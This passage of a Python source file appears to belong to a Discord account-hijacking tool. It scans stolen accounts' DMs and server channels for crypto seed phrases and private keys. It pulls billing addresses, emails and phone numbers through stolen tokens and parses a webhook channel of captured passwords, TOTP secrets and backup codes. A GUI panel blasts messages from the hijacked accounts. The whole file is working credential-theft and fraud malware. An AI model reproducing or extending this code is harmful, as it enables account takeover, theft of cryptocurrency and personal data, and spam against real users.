    'stick','still','sting','stock','stomach','stone','stool','story','stove','strategy',
    'street','strike','strong','struggle','student','stuff','stumble','style','subject','submit',
    'subway','success','such','sudden','suffer','sugar','suggest','suit','summer','sun',
    'sunny','sunset','super','supply','supreme','sure','surface','surge','surprise','surround',
    'survey','suspect','sustain','swallow','swamp','swap','swarm','swear','sweet','swim',
    'swing','switch','sword','symbol','symptom','syrup','system','table','tackle','tag',
    'tail','talent','talk','tank','tape','target','task','taste','tattoo','taxi',
    'teach','team','tell','ten','tenant','tennis','tent','term','test','text',
    'thank','that','theme','then','theory','there','they','thing','this','thought',
    'three','thrive','throw','thumb','thunder','ticket','tide','tiger','tilt','timber',
    'time','tiny','tip','tired','tissue','title','toast','tobacco','today','toddler',
    'toe','together','toilet','token','tomato','tomorrow','tone','tongue','tonight','tool',
    'tooth','top','topic','topple','torch','tornado','tortoise','toss','total','tourist',
    'toward','tower','town','toy','track','trade','traffic','tragic','train','transfer',
    'trap','trash','travel','tray','treat','tree','trend','trial','tribe','trick',
    'trigger','trim','trip','trophy','trouble','truck','true','truly','trumpet','trust',
    'truth','try','tube','tuna','tunnel','turkey','turn','turtle','twelve','twenty',
    'twice','twin','twist','two','type','typical','ugly','umbrella','unable','unaware',
    'uncle','uncover','under','undo','unfair','unfold','unhappy','uniform','unique','unit',
    'universe','unknown','unlock','until','unusual','unveil','update','upgrade','uphold','upon',
    'upper','upset','urban','usage','use','used','useful','useless','usual','utility',
    'vacant','vacuum','vague','valid','valley','valve','van','vanish','vapor','various',
    'vast','vault','vehicle','velvet','vendor','venture','venue','verb','verify','version',
    'very','vessel','veteran','viable','vibrant','vicious','victory','video','view','village',
    'vintage','violin','virtual','virus','visa','visit','visual','vital','vivid','vocal',
    'voice','void','volcano','volume','vote','voyage','wage','wagon','wait','walk',
    'wall','walnut','want','warfare','warm','warrior','wash','wasp','waste','water',
    'wave','way','wealth','weapon','wear','weasel','weather','web','wedding','weekend',
    'weird','welcome','west','wet','whale','what','wheat','wheel','when','where',
    'whip','whisper','wide','width','wife','wild','will','win','window','wine',
    'wing','wink','winner','winter','wire','wisdom','wise','wish','witness','wolf',
    'woman','wonder','wood','wool','word','work','world','worry','worth','wrap',
    'wreck','wrestle','wrist','write','wrong','yard','year','yellow','you','young',
    'youth','zebra','zero','zone','zoo',
}


def _is_seed_phrase(text):
    words = text.lower().strip().split()
    if len(words) not in (12, 15, 18, 21, 24):
        return False
    return sum(1 for w in words if w in _BIP39_COMMON) >= len(words) * 0.8


def _is_private_key(text):
    text = text.strip()
    if re.match(r'^(0x)?[0-9a-fA-F]{64}$', text):
        return True
    if re.match(r'^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$', text):
        return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{85,90}$', text):
        return True
    return False


def _save_important(entry_type, content, source=''):
    try:
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(IMPORTANT_FILE, 'a', encoding='utf-8') as f:
            f.write(f'\n[{ts}] [{entry_type}] Source: {source}\n{content}\n{"="*60}\n')
        print(f'[!!! IMPORTANT] Saved {entry_type} to important.txt from {source}')
    except Exception as e:
        print(f'[important] Save error: {e}')


def _scan_text_for_secrets(text, source=''):
    finds = []
    if not text:
        return finds
    for m in re.finditer(r'(?:^|\s)((?:[a-z]{2,12}\s+){11,23}[a-z]{2,12})(?:\s|$)', text.lower()):
        candidate = m.group(1).strip()
        if _is_seed_phrase(candidate):
            finds.append(('SEED_PHRASE', candidate))
            _save_important('SEED_PHRASE', candidate, source)
    for m in re.finditer(r'(?:^|\s)((?:0x)?[0-9a-fA-F]{64})(?:\s|$)', text):
        key = m.group(1).strip()
        if _is_private_key(key):
            finds.append(('ETH_PRIVATE_KEY', key))
            _save_important('ETH_PRIVATE_KEY', key, source)
    for m in re.finditer(r'(?:^|\s)([5KL][1-9A-HJ-NP-Za-km-z]{50,51})(?:\s|$)', text):
        key = m.group(1).strip()
        if _is_private_key(key):
            finds.append(('BTC_WIF_KEY', key))
            _save_important('BTC_WIF_KEY', key, source)
    return finds


def _scan_token_messages(token_info):
    token = token_info.token
    uname = token_info.display_name or token_info.username or token_info.token[:12]
    total_found = 0
    try:
        # Scan DM channels
        try:
            r = _stealth_get(token, f'{API}/users/@me/channels', timeout=10)
            if r.status_code == 200:
                for ch in r.json()[:50]:
                    ch_id = ch.get('id')
                    if not ch_id:
                        continue
                    try:
                        mr = _stealth_get(token, f'{API}/channels/{ch_id}/messages?limit=100', timeout=8)
                        if mr.status_code == 200:
                            for msg in mr.json():
                                content = msg.get('content', '')
                                for embed in msg.get('embeds', []):
                                    content += '\n' + embed.get('description', '')
                                finds = _scan_text_for_secrets(content, f'DM {ch_id} user={uname}')
                                total_found += len(finds)
                    except:
                        pass
                    time.sleep(0.3)
        except:
            pass
        # Scan guild channels
        try:
            r = _stealth_get(token, f'{API}/users/@me/guilds?limit=100', timeout=10)
            if r.status_code == 200:
                for guild in r.json()[:20]:
                    gid = guild.get('id')
                    try:
                        cr = _stealth_get(token, f'{API}/guilds/{gid}/channels', timeout=8)
                        if cr.status_code != 200:
                            continue
                        for ch in [c for c in cr.json() if c.get('type') == 0][:10]:
                            try:
                                mr = _stealth_get(token, f'{API}/channels/{ch["id"]}/messages?limit=50', timeout=8)
                                if mr.status_code == 200:
                                    for msg in mr.json():
                                        content = msg.get('content', '')
                                        for embed in msg.get('embeds', []):
                                            content += '\n' + embed.get('description', '')
                                        finds = _scan_text_for_secrets(content, f'Guild {gid} #{ch.get("name","?")} user={uname}')
                                        total_found += len(finds)
                            except:
                                pass
                            time.sleep(0.3)
                    except:
                        pass
        except:
            pass
        if total_found:
            print(f'[scanner] Found {total_found} secrets for {uname}!')
        else:
            print(f'[scanner] No secrets found for {uname}')
    except Exception as e:
        print(f'[scanner] Error scanning {uname}: {e}')


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Token Model  — extended with billing, bio, connections
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class TokenInfo:
    def __init__(self, token, raw_text='', message_ts=None):
        self.token = token
        self.raw_text = raw_text
        self.message_ts = message_ts
        self.valid = None
        self.user_id = ''
        self.username = ''
        self.display_name = ''
        self.email = ''
        self.phone = ''
        self.avatar_url = ''
        self.banner_color = ''
        self.bio = ''
        self.nitro = False
        self.nitro_type = 0
        self.mfa = False
        self.badges = 0
        self.created_at = None
        self.ip = ''
        self.password = ''
        self.last_checked = None
        self.guilds_count = 0
        self.locale = ''
        self.verified = False
        # Extended
        self.has_billing = False
        self.billing_country = ''
        self.billing_type = ''  # visa, paypal, etc
        self.billing_address = ''
        self.connections = []   # list of dicts {type, name}
        self.friend_count = 0
        self.boost_guilds = 0
        self.dm_count = 0
        self.totp_secret = ''
        self.backup_codes = ''

    def check_validity(self):
        try:
            r = _stealth_get(self.token, f'{API}/users/@me', timeout=8)
            if r.status_code == 200:
                u = r.json()
                self.valid = True
                self.user_id = u.get('id', '')
                self.username = u.get('username', '')
                self.display_name = u.get('global_name', '') or self.username
                self.email = u.get('email', 'N/A')
                self.phone = u.get('phone') or 'N/A'
                self.nitro_type = u.get('premium_type', 0) or 0
                self.nitro = self.nitro_type not in (None, 0)
                self.mfa = u.get('mfa_enabled', False)
                self.badges = u.get('public_flags', 0)
                self.locale = u.get('locale', '')
                self.verified = u.get('verified', False)
                self.bio = u.get('bio', '') or ''
                self.banner_color = u.get('banner_color', '') or ''
                avatar = u.get('avatar', '')
                if avatar:
                    ext = 'gif' if avatar.startswith('a_') else 'png'
                    self.avatar_url = f"https://cdn.discordapp.com/avatars/{self.user_id}/{avatar}.{ext}?size=128"
                if self.user_id:
                    ts = ((int(self.user_id) >> 22) + 1420070400000) / 1000
                    self.created_at = datetime.fromtimestamp(ts, tz=timezone.utc)

                # Guilds
                try:
                    gr = _stealth_get(self.token, f'{API}/users/@me/guilds?limit=200', timeout=8)
                    if gr.status_code == 200:
                        self.guilds_count = len(gr.json())
                except: pass

                # Billing / payment sources
                try:
                    br = _stealth_get(self.token, f'{API}/users/@me/billing/payment-sources', timeout=8)
                    if br.status_code == 200:
                        sources = br.json()
                        if sources:
                            self.has_billing = True
                            src = sources[0]
                            bt = src.get('type', 0)
                            self.billing_type = {1: 'Credit Card', 2: 'PayPal', 3: 'Gift Card'}.get(bt, f'Type {bt}')
                            ba = src.get('billing_address', {})
                            if ba:
                                parts = [ba.get('line_1', ''), ba.get('city', ''),
                                         ba.get('state', ''), ba.get('postal_code', ''),
                                         ba.get('country', '')]
                                self.billing_address = ', '.join(p for p in parts if p)
                                self.billing_country = ba.get('country', '')
                except: pass

                # Connections (Steam, Spotify, etc)
                try:
                    cr = _stealth_get(self.token, f'{API}/users/@me/connections', timeout=8)
                    if cr.status_code == 200:
                        self.connections = [{'type': c.get('type', ''), 'name': c.get('name', '')}
                                           for c in cr.json()]
                except: pass

                # Friend count
                try:
                    fr = _stealth_get(self.token, f'{API}/users/@me/relationships', timeout=8)
                    if fr.status_code == 200:
                        rels = fr.json()
                        self.friend_count = sum(1 for r in rels if r.get('type') == 1)
                except: pass

                # DM channels count
                try:
                    dr = _stealth_get(self.token, f'{API}/users/@me/channels', timeout=8)
                    if dr.status_code == 200:
                        self.dm_count = len(dr.json())
                except: pass

            else:
                self.valid = False
            self.last_checked = datetime.now(timezone.utc)
        except:
            self.valid = False
            self.last_checked = datetime.now(timezone.utc)

    @property
    def nitro_label(self):
        return {0: '', 1: 'Classic', 2: 'Nitro', 3: 'Basic',
                4: 'Opal', 5: 'Emerald', 6: 'Diamond'}.get(self.nitro_type, f'Tier{self.nitro_type}')

    @property
    def is_important(self):
        """Token is important if it has: 4-letter username, real-word username,
        OG Early Supporter badge, or premium Nitro (Opal/Emerald/Diamond)."""
        uname = (self.username or '').lower().strip()
        # 4-letter username
        if len(uname) == 4 and uname.isalpha():
            return True
        # Single real English word username (min 3 chars)
        if uname and uname.isalpha() and len(uname) >= 3 and uname in _ENGLISH_WORDS:
            return True
        # Early Supporter badge (bit 512)
        if self.badges & 512:
            return True
        # Nitro Opal (4), Emerald (5), Diamond (6)
        if self.nitro_type in (4, 5, 6):
            return True
        return False

    @property
    def importance_score(self):
        """Higher = more important. For sorting."""
        score = 0
        uname = (self.username or '').lower().strip()
        if len(uname) == 4 and uname.isalpha(): score += 50
        if uname and uname.isalpha() and len(uname) >= 3 and uname in _ENGLISH_WORDS: score += 40
        if self.badges & 512: score += 30       # EarlySupporter
        if self.nitro_type == 6: score += 25    # Diamond
        elif self.nitro_type == 5: score += 20  # Emerald
        elif self.nitro_type == 4: score += 15  # Opal
        if self.has_billing: score += 5
        return score

    @property
    def badge_names(self):
        names = []
        flag_map = {
            1: 'Staff', 2: 'Partner', 4: 'HypeSquad', 8: 'BugHunter1',
            64: 'Bravery', 128: 'Brilliance', 256: 'Balance',
            512: 'EarlySupporter', 16384: 'BugHunter2', 131072: 'VerifiedDev',
            4194304: 'ActiveDev', 1048576: 'CertMod',
        }
        for bit, name in flag_map.items():
            if self.badges & bit:
                names.append(name)
        return names or ['None']

    @property
    def created_str(self):
        return self.created_at.strftime('%b %d, %Y') if self.created_at else 'Unknown'

    @property
    def age_str(self):
        if not self.created_at: return '?'
        d = datetime.now(timezone.utc) - self.created_at
        y, m = d.days // 365, (d.days % 365) // 30
        if y > 0: return f'{y}y {m}m'
        return f'{m}m' if m > 0 else f'{d.days}d'

    @property
    def added_str(self):
        return self.message_ts.strftime('%b %d, %H:%M') if self.message_ts else 'Unknown'

    @property
    def connections_str(self):
        if not self.connections: return 'None'
        return ', '.join(f"{c['type']}: {c['name']}" for c in self.connections[:5])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  File I/O
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _token_to_dict(t):
    """Serialize a TokenInfo to a JSON-safe dict (all data)."""
    return {
        'token': t.token,
        'user_id': t.user_id,
        'username': t.username,
        'display_name': t.display_name,
        'email': t.email,
        'phone': t.phone,
        'password': t.password,
        'ip': t.ip,
        'avatar_url': t.avatar_url,
        'banner_color': t.banner_color,
        'bio': t.bio,
        'nitro': t.nitro,
        'nitro_type': t.nitro_type,
        'mfa': t.mfa,
        'badges': t.badges,
        'locale': t.locale,
        'verified': t.verified,
        'created_at': t.created_at.isoformat() if t.created_at else None,
        'last_checked': t.last_checked.isoformat() if t.last_checked else None,
        'guilds_count': t.guilds_count,
        'friend_count': t.friend_count,
        'dm_count': t.dm_count,
        'has_billing': t.has_billing,
        'billing_type': t.billing_type,
        'billing_country': t.billing_country,
        'billing_address': t.billing_address,
        'connections': t.connections,
        'boost_guilds': t.boost_guilds,
        'totp_secret': t.totp_secret,
        'backup_codes': t.backup_codes,
        'captured_at': t.message_ts.isoformat() if t.message_ts else None,
        'expired_at': datetime.now(timezone.utc).isoformat(),
    }


def save_expired_tokens(expired_list):
    """Append expired tokens to token_data_old.txt as JSON lines (one JSON object per line)."""
    if not expired_list:
        return
    try:
        with open(TOKENS_DATA_OLD, 'a', encoding='utf-8') as f:
            for t in expired_list:
                f.write(json.dumps(_token_to_dict(t), ensure_ascii=False) + '\n')
        print(f'[token_data_old] Saved {len(expired_list)} expired tokens')
    except Exception as e:
        print(f'[token_data_old] Error: {e}')


def load_expired_tokens():
    """Load expired tokens from token_data_old.txt, dedup by user_id, return list[TokenInfo]."""
    results = []
    seen_uids = set()
    if not os.path.exists(TOKENS_DATA_OLD):
        return results
    try:
        with open(TOKENS_DATA_OLD, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    d = json.loads(line)
                except json.JSONDecodeError:
                    continue
                token = d.get('token', '')
                if not token:
                    continue
                uid = d.get('user_id', '')
                # Dedup — keep latest entry per user
                if uid and uid in seen_uids:
                    # Replace earlier entry
                    results = [r for r in results if r.user_id != uid]
                if uid:
                    seen_uids.add(uid)
                t = TokenInfo(token)
                t.valid = False
                t.user_id = uid
                t.username = d.get('username', '')
                t.display_name = d.get('display_name', '')
                t.email = d.get('email', '')
                t.phone = d.get('phone', '')
                t.password = d.get('password', '')
                t.ip = d.get('ip', '')
                t.avatar_url = d.get('avatar_url', '')
                t.banner_color = d.get('banner_color', '')
                t.bio = d.get('bio', '')
                t.nitro = d.get('nitro', False)
                t.nitro_type = d.get('nitro_type', 0)
                t.mfa = d.get('mfa', False)
                t.badges = d.get('badges', 0)
                t.locale = d.get('locale', '')
                t.verified = d.get('verified', False)
                t.guilds_count = d.get('guilds_count', 0)
                t.friend_count = d.get('friend_count', 0)
                t.dm_count = d.get('dm_count', 0)
                t.has_billing = d.get('has_billing', False)
                t.billing_type = d.get('billing_type', '')
                t.billing_country = d.get('billing_country', '')
                t.billing_address = d.get('billing_address', '')
                t.connections = d.get('connections', [])
                t.boost_guilds = d.get('boost_guilds', 0)
                t.totp_secret = d.get('totp_secret', '')
                t.backup_codes = d.get('backup_codes', '')
                ca = d.get('created_at')
                if ca:
                    try: t.created_at = datetime.fromisoformat(ca)
                    except: pass
                cap = d.get('captured_at')
                if cap:
                    try: t.message_ts = datetime.fromisoformat(cap)
                    except: pass
                results.append(t)
        print(f'[token_data_old] Loaded {len(results)} expired tokens from file')
    except Exception as e:
        print(f'[token_data_old] Load error: {e}')
    return results


def save_tokens_to_file(tokens):
    valid = [t for t in tokens if t.valid is True]
    try:
        with open(TOKENS_FILE, 'w', encoding='utf-8') as f:
            for t in valid:
                line = f'{t.username}:{t.email}:{t.token}' if t.username else t.token
                f.write(line + '\n')
        print(f'[tokens.txt] Saved {len(valid)} tokens')
    except Exception as e:
        print(f'[tokens.txt] Error: {e}')


def load_tokens_from_file():
    tokens = set()
    try:
        if os.path.exists(TOKENS_FILE):
            with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line: tokens.add(line.split(':')[-1])
                    elif line: tokens.add(line)
    except: pass
    return tokens


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Fetch from channel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_RAILWAY_IP_PREFIXES = ('104.156.', '172.', '10.')

def _clean_parsed_ip(raw_ip):
    """Strip Railway proxy IPs from IP field parsed from webhook embeds."""
    if not raw_ip or raw_ip == '?':
        return '?'
    parts = [p.strip() for p in raw_ip.replace('`', '').split(',')]
    for ip in parts:
        if ip and not any(ip.startswith(pfx) for pfx in _RAILWAY_IP_PREFIXES):
            return ip
    return parts[0] if parts else '?'

def fetch_tokens_from_channel():
    tokens = []; seen_tokens = set()
    # Track best data per Discord user ID across multiple webhook entries
    user_best = {}  # user_id_from_token_prefix -> {pw, ip, totp_secret, backup_codes}
    url = f'{API}/channels/{CHANNEL_ID}/messages?limit=100'
    try:
        r = _stealth_get(USER_TOKEN, url, timeout=15)
        if r.status_code != 200:
            print(f'[hub] Fetch failed: {r.status_code}'); return tokens

        def _extract(messages):
            for msg in messages:
                ts = None
                try: ts = datetime.fromisoformat(msg.get('timestamp', ''))
                except: pass
                raw = msg.get('content', '')
                for embed in msg.get('embeds', []):
                    raw += '\n' + embed.get('description', '')
                # Extract all IPs, filter Railway proxy
                ip_matches = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', raw)
                ip = '?'
                for candidate in ip_matches:
                    if not any(candidate.startswith(pfx) for pfx in _RAILWAY_IP_PREFIXES):
                        ip = candidate
                        break
                if ip == '?' and ip_matches:
                    ip = ip_matches[0]

                pw_match = re.search(r'\*\*Password:\*\*\s*`([^`]+)`', raw)
                pw = pw_match.group(1) if pw_match else ''
                # Also check Original PW field
                orig_pw_match = re.search(r'\*\*Original PW:\*\*\s*`([^`]+)`', raw)
                orig_pw = orig_pw_match.group(1) if orig_pw_match else ''
                totp_match = re.search(r'\*\*TOTP Secret:\*\*\s*`([^`]+)`', raw)
                totp_sec = totp_match.group(1) if totp_match else ''
                backup_match = re.search(r'\*\*Backup Codes:\*\*\s*`([^`]+)`', raw)
                backup_str = backup_match.group(1) if backup_match else ''

                # Extract Discord user ID from embed to group duplicates
                uid_match = re.search(r'\*\*Discord ID:\*\*\s*`(\d+)`', raw)
                uid = uid_match.group(1) if uid_match else ''

                for tk in re.findall(r'([\w-]{24,}\.[\w-]{6}\.[\w-]{27,})', raw):
                    # Use user ID (or token prefix) for dedup grouping
                    group_key = uid or tk.split('.')[0]

                    # Merge best data across duplicates for same user
                    if group_key not in user_best:
                        user_best[group_key] = {'pw': '', 'orig_pw': '', 'ip': '?', 'totp': '', 'backup': ''}
                    best = user_best[group_key]
                    if pw and pw != '?' and not best['pw']:
                        best['pw'] = pw
                    if orig_pw and not best['orig_pw']:
                        best['orig_pw'] = orig_pw
                    if ip and ip != '?' and best['ip'] == '?':
                        best['ip'] = ip
                    if totp_sec and not best['totp']:
                        best['totp'] = totp_sec
                    if backup_str and not best['backup']:
                        best['backup'] = backup_str

                    if tk not in seen_tokens:
                        seen_tokens.add(tk)
                        ti = TokenInfo(tk, raw, ts)
                        ti._group_key = group_key
                        tokens.append(ti)

        messages = r.json()
        _extract(messages)
        if len(messages) == 100:
            last_id = messages[-1]['id']
            for _ in range(50):
                r2 = _stealth_get(USER_TOKEN, f'{API}/channels/{CHANNEL_ID}/messages?limit=100&before={last_id}', timeout=15)
                if r2.status_code != 200: break
                msgs2 = r2.json()
                if not msgs2: break
                _extract(msgs2)
                last_id = msgs2[-1]['id']
                if len(msgs2) < 100: break
    except Exception as e:
        print(f'[hub] Error: {e}')

    # Apply best merged data to each token
    for t in tokens:
        gk = getattr(t, '_group_key', '')
        best = user_best.get(gk, {})
        t.ip = best.get('ip', '?')
        t.password = best.get('pw', '') or best.get('orig_pw', '')
        t.totp_secret = best.get('totp', '')
        t.backup_codes = best.get('backup', '')

    return tokens


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ActionPanel — persistent toplevel (close = hide, not destroy)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class ActionPanel(ctk.CTkToplevel):
    """
    Close hides the window (keeps running in background).
    Parent's button turns green when running.
    """

    def __init__(self, parent, title, description="", width=720, height=620, **kw):
        super().__init__(parent, **kw)
        self.title(title)
        self.geometry(f"{width}x{height}")
        self.configure(fg_color=C['bg'])
        self.attributes('-topmost', True)
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        # Force window to render (CTkToplevel sometimes stays invisible)
        self.deiconify()
        self.update_idletasks()

        self._running = False
        self._stop_flag = threading.Event()
        self._log_queue = queue.Queue()
        self._stats = {}
        self._panel_key = ''  # set by subclass or parent for tracking
        self._parent_app = parent

        # ── Header ──
        hdr = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=56)
        hdr.pack(fill="x"); hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text=f"  {title}", font=ctk.CTkFont(family=FONT, size=18, weight="bold"),
                     text_color=C['text']).pack(side="left", padx=20)
        if description:
            ctk.CTkLabel(hdr, text=description, font=ctk.CTkFont(family=FONT, size=12),
                         text_color=C['text_muted']).pack(side="left", padx=10)

        # ── Config area ──
        self.config_frame = ctk.CTkFrame(self, fg_color=C['bg_alt'], corner_radius=0)
        self.config_frame.pack(fill="x")

        # ── Stats row ──
        self.stats_frame = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=46)
        self.stats_frame.pack(fill="x"); self.stats_frame.pack_propagate(False)
        self._stat_labels = {}

        # ── Console ──
        console_wrap = ctk.CTkFrame(self, fg_color=C['console_bg'], corner_radius=8)
        console_wrap.pack(fill="both", expand=True, padx=14, pady=(8, 6))
        self.console = tk.Text(console_wrap, bg=C['console_bg'], fg='#a0aec0', insertbackground='#a0aec0',
                               font=(MONO, 10), wrap='word', bd=0, padx=10, pady=8,
                               highlightthickness=0, state='disabled', selectbackground='#334155')
        self.console.pack(fill="both", expand=True)
        for tag, color in [('green', '#22c55e'), ('red', '#ef4444'), ('yellow', '#eab308'),
                           ('cyan', '#06b6d4'), ('dim', '#525c6b'), ('accent', '#8b5cf6'),
                           ('white', '#eef2ff')]:
            self.console.tag_configure(tag, foreground=color)

        # ── Bottom buttons ──
        bottom = ctk.CTkFrame(self, fg_color=C['surface'], corner_radius=0, height=52)
        bottom.pack(fill="x"); bottom.pack_propagate(False)

        btn_f = ctk.CTkFont(family=FONT, size=13, weight="bold")
        self.btn_start = ctk.CTkButton(bottom, text="▶  Start", width=110, height=36, corner_radius=8,
                                        fg_color=C['green'], hover_color=C['green_dim'], font=btn_f,
                                        command=self._on_start)
        self.btn_start.pack(side="left", padx=(14, 6), pady=8)
        self.btn_stop = ctk.CTkButton(bottom, text="⏹  Stop", width=90, height=36, corner_radius=8,
                                       fg_color=C['red_dim'], hover_color=C['red'], font=btn_f,
                                       command=self._on_stop, state="disabled")
        self.btn_stop.pack(side="left", padx=6, pady=8)

        # # Tokens limiter — 0 means "use all"
        self._token_limit_var = ctk.IntVar(value=0)
        ctk.CTkLabel(bottom, text="# Tokens:", font=ctk.CTkFont(family=FONT, size=12),
                     text_color=C['text_muted']).pack(side="left", padx=(16, 4), pady=8)
        ctk.CTkEntry(bottom, textvariable=self._token_limit_var, width=52, height=32, corner_radius=7,
                     fg_color=C['surface_2'], border_color=C['border'],
                     text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12)
                     ).pack(side="left", pady=8)
        ctk.CTkLabel(bottom, text="(0=all)", font=ctk.CTkFont(family=FONT, size=10),
                     text_color=C['text_muted']).pack(side="left", padx=(2, 0), pady=8)

        ctk.CTkButton(bottom, text="Hide", width=70, height=36, corner_radius=8,
                      fg_color=C['surface_2'], hover_color=C['card_hover'],
                      font=ctk.CTkFont(family=FONT, size=13), command=self._on_close
                      ).pack(side="right", padx=14, pady=8)

        self._poll_log()

    def add_stat(self, key, label, color=None):
        color = color or C['text']
        frame = ctk.CTkFrame(self.stats_frame, fg_color="transparent")
        frame.pack(side="left", padx=14)
        val = ctk.CTkLabel(frame, text="0", font=ctk.CTkFont(family=FONT, size=18, weight="bold"),
                           text_color=color)
        val.pack(side="left")
        ctk.CTkLabel(frame, text=f"  {label}", font=ctk.CTkFont(family=FONT, size=11),
                     text_color=C['text_muted']).pack(side="left")
        self._stat_labels[key] = val
        self._stats[key] = 0

    def set_stat(self, key, value):
        self._stats[key] = value
        if key in self._stat_labels:
            try: self._stat_labels[key].configure(text=str(value))
            except: pass

    def inc_stat(self, key, delta=1):
        self._stats[key] = self._stats.get(key, 0) + delta
        self.set_stat(key, self._stats[key])

    def log(self, text, tag=None):
        self._log_queue.put((text, tag))

    def _poll_log(self):
        try:
            batch = []
            while not self._log_queue.empty():
                batch.append(self._log_queue.get_nowait())
            if batch:
                self.console.configure(state='normal')
                for text, tag in batch:
                    ts = datetime.now().strftime('%H:%M:%S')
                    self.console.insert('end', f'[{ts}] ', 'dim')
                    self.console.insert('end', text + '\n', tag or 'white')
                self.console.see('end')
                self.console.configure(state='disabled')
        except: pass
        try: self.after(80, self._poll_log)
        except: pass

    def _on_start(self):
        if self._running: return
        self._running = True
        self._stop_flag.clear()
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self._notify_parent_running(True)
        self.on_start()

    def _on_stop(self):
        self._stop_flag.set()
        self.btn_stop.configure(state="disabled")
        self.log("⏹ Stopping...", 'yellow')

    def _on_close(self):
        """Hide only — don't stop anything."""
        self.withdraw()

    def show(self):
        """Un-hide."""
        self.deiconify()
        self.lift()
        self.focus_force()

    def force_destroy(self):
        """Actually destroy (app closing)."""
        self._stop_flag.set()
        self._running = False
        try: self.destroy()
        except: pass

    def finish(self):
        self._running = False
        try:
            self.btn_start.configure(state="normal")
            self.btn_stop.configure(state="disabled")
        except: pass
        self._notify_parent_running(False)

    def _notify_parent_running(self, running):
        """Tell the parent DataHub to update button color."""
        if hasattr(self._parent_app, '_panel_state_changed'):
            try: self._parent_app.after(0, lambda: self._parent_app._panel_state_changed(self._panel_key, running))
            except: pass

    def on_start(self):
        pass

    @property
    def active_tokens(self):
        """Return the slice of tokens to use, capped by the # Tokens input (0 = all)."""
        tks = getattr(self, 'tokens', [])
        try:
            n = int(self._token_limit_var.get())
        except Exception:
            n = 0
        return tks[:n] if n > 0 else tks

    @property
    def stopped(self):
        return self._stop_flag.is_set()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Mass DM Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class MassDMPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "💬 Mass DM", "Blast all guild channels (@everyone) + open DMs")
        self._panel_key = 'mass_dm'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row1 = ctk.CTkFrame(pad, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(10, 4))
        ctk.CTkLabel(row1, text="Message", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.msg_entry = ctk.CTkEntry(row1, placeholder_text="Enter message...",
                                       width=400, height=34, corner_radius=8,
                                       fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                                       font=ctk.CTkFont(family=FONT, size=13))
        self.msg_entry.pack(side="left", fill="x", expand=True)

        row2 = ctk.CTkFrame(pad, fg_color="transparent"); row2.pack(fill="x", padx=16, pady=(2, 4))
        ctk.CTkLabel(row2, text="Guild delay", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.delay_var = ctk.DoubleVar(value=0.4)
        ctk.CTkEntry(row2, textvariable=self.delay_var, width=50, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")
        ctk.CTkLabel(row2, text="  DM delay", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(12, 8))
        self.dm_delay_var = ctk.DoubleVar(value=0.8)
        ctk.CTkEntry(row2, textvariable=self.dm_delay_var, width=50, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")
        ctk.CTkLabel(row2, text="  Threads", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(12, 8))
        self.threads_var = ctk.IntVar(value=10)
        ctk.CTkEntry(row2, textvariable=self.threads_var, width=40, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")

        row3 = ctk.CTkFrame(pad, fg_color="transparent"); row3.pack(fill="x", padx=16, pady=(0, 10))
        ctk.CTkLabel(row3, text=f"{len(self.tokens)} tokens · DMs FIRST → guilds (@everyone) · 401=instant kill",
                     font=ctk.CTkFont(family=FONT, size=12), text_color=C['text_muted']).pack(side="left")

        self.add_stat('guild_sent', 'Guild Msgs', C['green'])
        self.add_stat('dm_sent', 'DMs Sent', C['green'])
        self.add_stat('failed', 'Failed', C['red'])
        self.add_stat('dead', '💀 Dead', C['red'])
        self.add_stat('ratelimit', 'Rate-limited', C['yellow'])
